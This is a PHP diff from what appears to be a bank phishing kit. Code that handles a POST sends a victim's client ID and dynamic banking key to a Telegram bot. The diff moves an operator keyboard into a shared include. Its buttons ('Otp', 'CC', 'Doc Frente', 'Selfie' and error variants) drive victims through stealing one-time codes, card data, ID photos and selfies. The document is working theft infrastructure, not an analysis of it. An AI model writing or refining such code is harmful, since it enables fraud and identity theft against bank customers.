@@ -32,36 +32,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $mensaje .= "🆔 Cliente: `$clienteId`\n";
     $mensaje .= "🔐 Clave Dinámica: `$dinamica`";
 
-    // Teclado con opciones (incluyendo las nuevas)
-    $keyboard = [
-        'inline_keyboard' => [
-            [
-                ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$clienteId"],
-                ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$clienteId"],
-            ],
-            [
-                ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$clienteId"],
-                ['text' => '💳 CC',         'callback_data' => "cmd_5_$clienteId"],
-            ],
-            [
-                ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$clienteId"],
-                ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$clienteId"],
-            ],
-            [
-                ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$clienteId"],
-                ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$clienteId"]
-            ],
-            [
-                ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$clienteId"],
-                ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$clienteId"]
-            ],
-            [
-                ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$clienteId"],
-                ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$clienteId"],
-                ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$clienteId"]
-            ]
-        ]
-    ];
+    // Teclado con opciones centralizado
+    require_once __DIR__ . '/../../config/telegram_keyboard.php';
+    $keyboard = getTelegramKeyboard($clienteId, $config);
 
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
     $postFields = [
